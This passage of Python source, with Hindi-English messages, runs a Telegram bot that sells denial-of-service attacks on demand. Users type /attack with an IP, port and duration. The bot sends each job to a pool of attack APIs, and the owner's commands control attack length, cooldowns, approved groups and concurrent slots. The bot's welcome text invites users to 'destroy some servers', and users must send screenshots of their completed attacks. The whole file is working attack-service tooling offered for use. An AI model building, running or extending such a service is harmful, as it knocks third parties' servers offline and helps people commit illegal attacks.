        bot.reply_to(message, f"❌ Error: {e}")


@bot.message_handler(commands=["channels"])
def channels_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    cid = get_private_channel_id()
    response = "═══════════════════════════\n📢 𝗣𝗥𝗜𝗩𝗔𝗧𝗘 𝗖𝗛𝗔𝗡𝗡𝗘𝗟\n═══════════════════════════\n\n"
    response += f"🔘 Required: ✅ YES\n"
    response += f"🔑 Key Needed After Join: ❌ NO\n\n"
    response += f"🔗 Invite Link:\n{PRIVATE_CHANNEL_LINK}\n\n"
    response += f"🆔 Channel ID: {cid if cid else '❌ NOT SET'}\n\n"
    if not cid:
        response += "⚠️ Set channel ID with:\n/setchannel -100xxxxxxxxxx"
    bot.reply_to(message, response)


@bot.message_handler(commands=["addgrp"])
def add_group_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    command_parts = message.text.split()
    if len(command_parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /addgrp <group_id>\n\nExample: /addgrp -1001234567890")
        return
    try:
        group_id = int(command_parts[1])
    except ValueError:
        bot.reply_to(message, "❌ Invalid group ID!")
        return
    if add_approved_group(group_id):
        bot.reply_to(message, f"✅ Group Approved!\n\n📢 Group ID: `{group_id}`", parse_mode="Markdown")
    else:
        bot.reply_to(message, f"ℹ️ Group `{group_id}` already approved!", parse_mode="Markdown")


@bot.message_handler(commands=["removegrp"])
def remove_group_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    command_parts = message.text.split()
    if len(command_parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /removegrp <group_id>")
        return
    try:
        group_id = int(command_parts[1])
    except ValueError:
        bot.reply_to(message, "❌ Invalid group ID!")
        return
    if remove_approved_group(group_id):
        bot.reply_to(message, f"✅ Group Removed!\n\n📢 Group ID: `{group_id}`", parse_mode="Markdown")
    else:
        bot.reply_to(message, f"❌ Group `{group_id}` not found!", parse_mode="Markdown")


@bot.message_handler(commands=["groups"])
def groups_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    approved = get_approved_groups()
    response = "═══════════════════════════\n📢 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 𝗚𝗥𝗢𝗨𝗣𝗦\n═══════════════════════════\n\n"
    response += f"⚡ Max Time: {get_group_max_attack_time()}s\n⏳ Cooldown: {get_group_cooldown()}s\n🔢 Max Slots: {len(API_LIST)}\n\n"
    if approved:
        response += f"📊 Total: {len(approved)}\n\n"
        for i, gid in enumerate(approved, 1):
            response += f"{i}. `{gid}`\n"
    else:
        response += "❌ No groups approved!\n"
    response += "\n═══════════════════════════\nCommands:\n• /addgrp <id>\n• /removegrp <id>"
    bot.reply_to(message, response, parse_mode="Markdown")


@bot.message_handler(commands=["ddos_on"])
def ddos_on_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    set_ddos_protection(True)
    protection.enabled = True
    bot.reply_to(message, "✅ DDoS Protection: ENABLED\n\nRate limit: 30 req/sec\nUser limit: 5 req/5 sec")


@bot.message_handler(commands=["ddos_off"])
def ddos_off_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    set_ddos_protection(False)
    protection.enabled = False
    bot.reply_to(message, "❌ DDoS Protection: DISABLED\n\nAll rate limits removed!")


@bot.message_handler(commands=["private_max"])
def private_max_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    command_parts = message.text.split()
    if len(command_parts) == 1:
        current = get_private_max_attack_time()
        bot.reply_to(message, f"⚙️ Current Private Max Attack Time: {current}s\n\nChange: /private_max <seconds>")
        return
    try:
        new_value = int(command_parts[1])
        if new_value < 10 or new_value > 600:
            bot.reply_to(message, "❌ Value 10-600 seconds ke beech hona chahiye!")
            return
        set_setting('private_max_attack_time', new_value)
        bot.reply_to(message, f"✅ Private Max Attack Time set: {new_value}s")
    except ValueError:
        bot.reply_to(message, "❌ Invalid number!")


@bot.message_handler(commands=["group_max"])
def group_max_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    command_parts = message.text.split()
    if len(command_parts) == 1:
        current = get_group_max_attack_time()
        bot.reply_to(message, f"⚙️ Current Group Max Attack Time: {current}s\n\nChange: /group_max <seconds>")
        return
    try:
        new_value = int(command_parts[1])
        if new_value < 10 or new_value > 300:
            bot.reply_to(message, "❌ Value 10-300 seconds ke beech hona chahiye!")
            return
        set_setting('group_max_attack_time', new_value)
        bot.reply_to(message, f"✅ Group Max Attack Time set: {new_value}s")
    except ValueError:
        bot.reply_to(message, "❌ Invalid number!")


@bot.message_handler(commands=["private_cooldown"])
def private_cooldown_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    command_parts = message.text.split()
    if len(command_parts) == 1:
        current = get_private_cooldown()
        bot.reply_to(message, f"⏳ Current Private Cooldown: {current}s\n\nChange: /private_cooldown <seconds>")
        return
    try:
        new_value = int(command_parts[1])
        if new_value < 0 or new_value > 3600:
            bot.reply_to(message, "❌ Value 0-3600 seconds ke beech hona chahiye!")
            return
        set_setting('private_cooldown', new_value)
        bot.reply_to(message, f"✅ Private Cooldown set: {new_value}s")
    except ValueError:
        bot.reply_to(message, "❌ Invalid number!")


@bot.message_handler(commands=["group_cooldown"])
def group_cooldown_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    command_parts = message.text.split()
    if len(command_parts) == 1:
        current = get_group_cooldown()
        bot.reply_to(message, f"⏳ Current Group Cooldown: {current}s\n\nChange: /group_cooldown <seconds>")
        return
    try:
        new_value = int(command_parts[1])
        if new_value < 0 or new_value > 3600:
            bot.reply_to(message, "❌ Value 0-3600 seconds ke beech hona chahiye!")
            return
        set_setting('group_cooldown', new_value)
        bot.reply_to(message, f"✅ Group Cooldown set: {new_value}s")
    except ValueError:
        bot.reply_to(message, "❌ Invalid number!")


@bot.message_handler(commands=["settings"])
def settings_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    cid = get_private_channel_id()
    response = "═══════════════════════════════════════\n⚙️ 𝗕𝗢𝗧 𝗦𝗘𝗧𝗧𝗜𝗡𝗚𝗦\n═══════════════════════════════════════\n\n"
    response += f"📱 𝗣𝗥𝗜𝗩𝗔𝗧𝗘\n• Max Time: {get_private_max_attack_time()}s\n• Cooldown: {get_private_cooldown()}s\n• Key Required: ❌ NO (channel join instead)\n• DDoS: {'✅ ON' if get_ddos_protection() else '❌ OFF'}\n\n"
    response += f"👥 𝗚𝗥𝗢𝗨𝗣\n• Max Time: {get_group_max_attack_time()}s\n• Cooldown: {get_group_cooldown()}s\n• Groups: {len(get_approved_groups())}\n\n"
    response += f"⚡ 𝗦𝗟𝗢𝗧𝗦\n• Max Concurrent Attacks: {len(API_LIST)}\n\n"
    response += f"📢 𝗖𝗛𝗔𝗡𝗡𝗘𝗟\n• Link: {PRIVATE_CHANNEL_LINK}\n• Channel ID: {cid if cid else '❌ NOT SET'}\n• Set: /setchannel <id>\n\n"
    response += f"🎬 𝗥𝗘𝗘𝗟\n• Status: {'ON' if get_reel_enabled() else 'OFF'}\n• Total: {len(get_reel_list())}\n\n"
    response += f"📸 𝗙𝗘𝗘𝗗𝗕𝗔𝗖𝗞\n• Status: {'ON' if get_feedback_enabled() else 'OFF'}\n\n"
    response += "Commands:\n/private_max <sec>\n/group_max <sec>\n/private_cooldown <sec>\n/group_cooldown <sec>\n/ddos_on /ddos_off\n/addgrp /removegrp"
    bot.reply_to(message, response)


@bot.message_handler(commands=["feedback_on"])
def feedback_on_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    set_feedback_enabled(True)
    bot.reply_to(message, "✅ Feedback enabled! Users must send screenshot after each attack.")


@bot.message_handler(commands=["feedback_off"])
def feedback_off_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    set_feedback_enabled(False)
    bot.reply_to(message, "✅ Feedback disabled! Users can attack without sending screenshot.")


@bot.message_handler(commands=["attack"])
def handle_attack(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id
    chat_id = message.chat.id
    is_group = message.chat.type not in ['private', 'personal']

    if is_group:
        if not check_group_approval(message):
            return

    if protection.is_ddos_attack(user_id, message.chat.id):
        bot.reply_to(message, "🚫 DDoS Protection: Too many requests! Wait 5 seconds.")
        return
    if not check_channel_join(message):
        return

    if get_feedback_enabled() and not is_owner(user_id):
        fb = get_pending_feedback(user_id)
        if fb:
            bot.reply_to(message,
                         f"📸 Pehle attack ka screenshot bhejo!\n🎯 {fb['target']}:{fb['port']} ⏱️ {fb['duration']}s")
            return
        cooldown = get_user_cooldown(user_id, is_group)
        if cooldown > 0:
            bot.reply_to(message, f"⏳ Cooldown active! Wait: {cooldown}s")
            return
        if user_has_active_attack(user_id):
            bot.reply_to(message, "❌ Tumhara pehle se ek attack chal raha hai!")
            return

    active_count = get_active_attack_count()
    max_concurrent = len(API_LIST)
    if active_count >= max_concurrent:
        bot.reply_to(message, f"❌ Abhi chudai lgi hui hai! ({active_count}/{max_concurrent})\n\n/status se check kro")
        return

    command_parts = message.text.split()
    if len(command_parts) != 4:
        bot.reply_to(message, "⚠️ Usage: /attack <ip> <port> <time>")
        return

    target, port, duration = command_parts[1], command_parts[2], command_parts[3]
    if not validate_target(target):
        bot.reply_to(message, "❌ Invalid IP!")
        return
    if is_ip_blocked(target):
        bot.reply_to(message, "🚫 Ye IP blocked hai! Dusra IP use karo.")
        return
    try:
        port = int(port)
        if port < 1 or port > 65535:
            bot.reply_to(message, "❌ Invalid port! (1-65535)")
            return
        duration = int(duration)
        if is_group:
            max_time = get_group_max_attack_time()
            cooldown_time = get_group_cooldown()
        else:
            max_time = get_private_max_attack_time()
            cooldown_time = get_private_cooldown()
        if not is_owner(user_id) and duration > max_time:
            bot.reply_to(message, f"❌ Max time: {max_time}s")
            return
        attack_id = f"{user_id}_{datetime.now().timestamp()}"
        api_index = get_free_api_index()
        if api_index is None:
            bot.reply_to(message, "❌ Koi free slot nahi mila! Wait karo.")
            return
        with _attack_lock:
            user_cooldowns[user_id] = datetime.now() + timedelta(seconds=cooldown_time + duration)
            if user_id not in user_attack_history:
                user_attack_history[user_id] = {}
            user_attack_history[user_id][f"{target}:{port}"] = datetime.now()
            api_in_use[attack_id] = api_index
            active_attacks[attack_id] = {
                'target': target,
                'port': port,
                'duration': duration,
                'user_id': user_id,
                'start_time': datetime.now(),
                'end_time': datetime.now() + timedelta(seconds=duration),
                'is_group': is_group
            }
        thread = threading.Thread(target=start_attack, args=(target, port, duration, message, attack_id, api_index, is_group))
        thread.start()
    except ValueError:
        bot.reply_to(message, "❌ Port and time must be numbers!")


@bot.message_handler(commands=['help'])
def show_help(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id
    if is_owner(user_id):
        help_text = f'''
👑 OWNER PANEL

📢 CHANNEL: /setchannel, /channels
⚡ ATTACK: /attack, /status, /settings, /private_max, /group_max, /private_cooldown, /group_cooldown
📢 GROUP: /addgrp, /removegrp, /groups
🎬 REEL: /reel_on, /reel_off, /addreel, /removereel, /listreels
📸 FEEDBACK: /feedback_on, /feedback_off
🛡️ PROTECTION: /ddos_on, /ddos_off
🔧 MAINTENANCE: /maintenance, /ok

🔢 Max Concurrent Attacks: {len(API_LIST)}
'''
    else:
        help_text = f'''🔐 𝗖𝗢𝗠𝗠𝗔𝗡𝗗 𝗨𝗦𝗘𝗥

• /attack <ip> <port> <time> – ⚡ Launch an attack
• /status – 📊 Live attack progress
• /verify – ✅ Check channel join
• /id – 🆔 Your user ID
• /ping – 🏓 Bot status

📢 Join channel to attack (no key needed):
🔗 {PRIVATE_CHANNEL_LINK}

🔥 𝗟𝗲𝘁’𝘀 𝗱𝗲𝘀𝘁𝗿𝗼𝘆 𝘀𝗼𝗺𝗲 𝘀𝗲𝗿𝘃𝗲𝗿𝘀! 💥'''
    bot.reply_to(message, help_text)


@bot.message_handler(commands=["block_ip"])
def block_ip_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    command_parts = message.text.split()
    if len(command_parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /block_ip <ip_prefix>\nExample: /block_ip 96.")
        return
    ip_prefix = command_parts[1]
    if add_blocked_ip(ip_prefix):
        bot.reply_to(message, f"✅ IP Blocked!\n🚫 Prefix: `{ip_prefix}`*")
    else:
        bot.reply_to(message, f"ℹ️ `{ip_prefix}` already blocked!")


@bot.message_handler(commands=["unblock_ip"])
def unblock_ip_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    command_parts = message.text.split()
    if len(command_parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /unblock_ip <ip_prefix>")
        return
    ip_prefix = command_parts[1]
    if remove_blocked_ip(ip_prefix):
        bot.reply_to(message, f"✅ IP Unblocked!\n✅ Prefix: `{ip_prefix}`")
    else:
        bot.reply_to(message, f"❌ `{ip_prefix}` not found!")


@bot.message_handler(commands=["blocked_ips"])
def blocked_ips_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    blocked = get_blocked_ips()
    if not blocked:
        bot.reply_to(message, "📋 Koi IP blocked nahi hai!")
        return
    response = "🚫 BLOCKED IPs\n\n"
    for i, ip in enumerate(blocked, 1):
        response += f"{i}. `{ip}`*\n"
    response += f"\n📊 Total: {len(blocked)}"
    bot.reply_to(message, response, parse_mode="Markdown")


@bot.message_handler(commands=["maintenance"])
def maintenance_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        return
    command_parts = message.text.split(maxsplit=1)
    if len(command_parts) < 2:
        bot.reply_to(message, "⚠️ Usage: /maintenance <message>")
        return
    msg = command_parts[1]
    set_maintenance(True, msg)
    bot.reply_to(message, f"🔧 Maintenance ON!\nMessage: {msg}\n\n/ok to turn off")


@bot.message_handler(commands=["ok"])
def ok_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        return
    if not is_maintenance():
        bot.reply_to(message, "ℹ️ Maintenance already OFF!")
        return
    set_maintenance(False)
    bot.reply_to(message, "✅ Maintenance OFF!\nBot normal hai.")


@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_id = message.from_user.id
    user_name = message.from_user.first_name
    track_bot_user(user_id, message.from_user.username)
    if check_maintenance(message): return
    if check_banned(message): return

    if is_owner(user_id):
        response = f'''👑 Welcome Owner, {user_name}!

🛡️ DDoS: {'ON' if get_ddos_protection() else 'OFF'}
📢 Channel: {'✅ SET' if get_private_channel_id() else '⚠️ NOT SET (/setchannel)'}
📢 Groups: {len(get_approved_groups())}
🔢 Max Slots: {len(API_LIST)}
🎬 Reel Feature: {'ON' if get_reel_enabled() else 'OFF'} ({len(get_reel_list())} reels)
📸 Feedback: {'ON' if get_feedback_enabled() else 'OFF'}
🔑 Key Required: ❌ NO (only channel join)

⚡ Private: Max {get_private_max_attack_time()}s | Cooldown {get_private_cooldown()}s
⚡ Groups: Max {get_group_max_attack_time()}s | Cooldown {get_group_cooldown()}s

Use /help for commands.
Use /settings for settings.
Use /setchannel <id> to set private channel.

⚡ Owner: No feedback required!'''
    else:
        response = f'''🚀 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗕𝗼𝘁

👑 𝗣𝗼𝘄𝗲𝗿𝗳𝘂𝗹 | 𝗦𝗲𝗰𝘂𝗿𝗲 | 𝗙𝗮𝘀𝘁

🔥 𝗖𝗢𝗠𝗠𝗔𝗡𝗗 𝗨𝗦𝗘𝗥 :
• /attack <ip> <port> <time> – ⚡ Launch an attack
• /status – 📊 Live attack progress
• /verify – ✅ Check channel join
• /help – ❓ Full command list

📢 𝗝𝗢𝗜𝗡 𝗖𝗛𝗔𝗡𝗡𝗘𝗟 𝗧𝗢 𝗔𝗧𝗧𝗔𝗖𝗞 (𝗡𝗢 𝗞𝗘𝗬 𝗡𝗘𝗘𝗗𝗘𝗗):
🔗 {PRIVATE_CHANNEL_LINK}

🔥 𝗟𝗲𝘁’𝘀 𝗱𝗲𝘀𝘁𝗿𝗼𝘆 𝘀𝗼𝗺𝗲 𝘀𝗲𝗿𝘃𝗲𝗿𝘀! 💥'''
    bot.reply_to(message, response)


@bot.message_handler(content_types=['photo'])
def handle_feedback_photo(message):
    user_id = message.from_user.id
    if user_id == BOT_OWNER:
        return
    if not get_feedback_enabled():
        return
    fb = get_pending_feedback(user_id)
    if not fb:
        return
    clear_pending_feedback(user_id)
    user_name = message.from_user.first_name
    username = message.from_user.username
    bot.reply_to(message,
                 f"✅ Feedback Received!\n🎯 {fb['target']}:{fb['port']} ⏱️ {fb['duration']}s\n\n⚡ Ab naya attack laga sakte ho!")
    try:
        photo = message.photo[-1]
        file_id = photo.file_id
        owner_msg = f"📸 New Feedback\n👤 {user_name}\n📛 @{username if username else 'N/A'}\n🆔 {user_id}\n🎯 {fb['target']}:{fb['port']}\n⏱️ {fb['duration']}s"
        bot.send_photo(BOT_OWNER, file_id, caption=owner_msg)
    except Exception as e:
        print(f"Feedback forward error: {e}")


@bot.message_handler(content_types=['document', 'video', 'text', 'audio', 'voice', 'sticker'])
def handle_other_feedback(message):
    user_id = message.from_user.id
    if user_id == BOT_OWNER:
        return
    if not get_feedback_enabled():
        return
    fb = get_pending_feedback(user_id)
    if fb:
        content_type = message.content_type
        if content_type == 'text':
            bot.reply_to(message,
                         f"📸 Send screenshot (photo), not text!\n🎯 {fb['target']}:{fb['port']} ⏱️ {fb['duration']}s")
        else:
            clear_pending_feedback(user_id)
            user_name = message.from_user.first_name
            username = message.from_user.username
            bot.reply_to(message,
                         f"✅ Feedback Received!\n🎯 {fb['target']}:{fb['port']} ⏱️ {fb['duration']}s\n\n⚡ Ab naya attack laga sakte ho!")
            try:
                owner_msg = f"📎 New Feedback\n👤 {user_name}\n📛 @{username if username else 'N/A'}\n🆔 {user_id}\n🎯 {fb['target']}:{fb['port']}\n⏱️ {fb['duration']}s"
                if content_type == 'document':
                    bot.send_document(BOT_OWNER, message.document.file_id, caption=owner_msg)
                elif content_type == 'video':
                    bot.send_video(BOT_OWNER, message.video.file_id, caption=owner_msg)
                elif content_type == 'audio':
                    bot.send_audio(BOT_OWNER, message.audio.file_id, caption=owner_msg)
                elif content_type == 'voice':
                    bot.send_voice(BOT_OWNER, message.voice.file_id, caption=owner_msg)
                elif content_type == 'sticker':
                    bot.send_sticker(BOT_OWNER, message.sticker.file_id)
                    bot.send_message(BOT_OWNER, owner_msg)
                else:
                    bot.send_message(BOT_OWNER, owner_msg)
            except Exception as e:
                print(f"Feedback forward error: {e}")


def load_saved_channels():
    cid = get_private_channel_id()
    if cid:
        print(f"📢 Private channel loaded: {cid}  (invite: {PRIVATE_CHANNEL_LINK})")
    else:
        print(f"⚠️ Private channel ID not set! Owner must run /setchannel <id>")
        print(f"📢 Invite link: {PRIVATE_CHANNEL_LINK}")


load_saved_channels()
protection.enabled = get_ddos_protection()

print("🔥 BOT STARTING...")
print(f"🌐 API: {API_BASE_URL}")
print(f"🔑 API Key: {API_KEY}")
print(f"🔢 API Slots: {API_SLOTS}")
print(f"🛡️ DDoS Protection: {'ON' if get_ddos_protection() else 'OFF'}")
print(f"📢 Channel Required: YES (private) | Key Needed After Join: NO")
print(f"📢 Approved Groups: {len(get_approved_groups())}")
print(f"⚡ Private Max Time: {get_private_max_attack_time()}s")
print(f"⚡ Group Max Time: {get_group_max_attack_time()}s")
print(f"⏳ Private Cooldown: {get_private_cooldown()}s")
print(f"⏳ Group Cooldown: {get_group_cooldown()}s")
print(f"🔢 Max Concurrent Slots: {len(API_LIST)}")
print(f"🎬 Reel Feature: {'ON' if get_reel_enabled() else 'OFF'} ({len(get_reel_list())} reels)")
print(f"📸 Feedback Feature: {'ON' if get_feedback_enabled() else 'OFF'}")
print("=" * 50)

while True:
    try:
        bot.polling(none_stop=True, interval=0, timeout=20)
    except Exception as e:
        print("Polling crashed, restarting...", e)
        time.sleep(3)